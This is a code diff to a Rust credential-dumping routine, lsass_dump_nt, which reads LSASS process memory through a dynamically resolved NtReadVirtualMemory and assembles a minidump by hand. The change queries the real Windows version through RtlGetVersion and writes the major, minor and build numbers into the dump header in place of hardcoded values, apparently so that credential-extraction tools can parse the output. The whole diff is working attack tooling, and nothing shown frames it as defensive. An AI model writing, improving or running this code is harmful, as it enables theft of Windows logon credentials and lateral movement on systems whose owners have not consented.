@@ -508,6 +508,7 @@ unsafe fn lsass_dump_nt(lsas_pid: u32) -> Vec<u8> {
     use windows_sys::Win32::System::Threading::PROCESS_VM_READ;
     use windows_sys::Win32::System::Memory::{VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT};
     use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+    use windows_sys::Win32::System::SystemInformation::OSVERSIONINFOW;
 
     let mut pid = lsas_pid;
     if pid == 0 {
@@ -543,6 +544,18 @@ unsafe fn lsass_dump_nt(lsas_pid: u32) -> Vec<u8> {
     let nt_read_raw = GetProcAddress(ntdll, b"NtReadVirtualMemory\0".as_ptr());
     if nt_read_raw.is_none() { return Vec::new(); }
     let nt_read: NtReadVM = std::mem::transmute(nt_read_raw.unwrap());
+
+    // detect real OS version via RtlGetVersion (bypasses compatibility shim)
+    type RtlGetVersion_t = unsafe extern "system" fn(*mut OSVERSIONINFOW) -> i32;
+    let mut osvi: OSVERSIONINFOW = std::mem::zeroed();
+    osvi.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as u32;
+    if let Some(rtl) = GetProcAddress(ntdll, b"RtlGetVersion\0".as_ptr()) {
+        let pfn: RtlGetVersion_t = std::mem::transmute(rtl);
+        pfn(&mut osvi);
+    }
+    let os_major: u32 = if osvi.dwMajorVersion != 0 { osvi.dwMajorVersion } else { 10 };
+    let os_minor: u32 = osvi.dwMinorVersion;
+    let os_build: u32 = if osvi.dwBuildNumber  != 0 { osvi.dwBuildNumber  } else { 19041 };
 
     // Module enumeration
     struct ModInfo { base: u64, size: u32, name: Vec<u8> }
@@ -645,8 +658,9 @@ unsafe fn lsass_dump_nt(lsas_pid: u32) -> Vec<u8> {
     pu16!(s+2,  6u16);    // ProcessorLevel
     buf[s+6] = 1;          // NumberOfProcessors
     buf[s+7] = 1;          // ProductType
-    pu32!(s+8,  10u32);   // MajorVersion
-    pu32!(s+16, 19041u32); // BuildNumber
+    pu32!(s+8,  os_major);  // MajorVersion
+    pu32!(s+12, os_minor);  // MinorVersion
+    pu32!(s+16, os_build);  // BuildNumber
     pu32!(s+20, 2u32);     // PlatformId
     // CSDVersionRva → 6-byte empty MINIDUMP_STRING after the 56-byte struct
     // (Length=0, null wchar — already zero from vec![0u8])
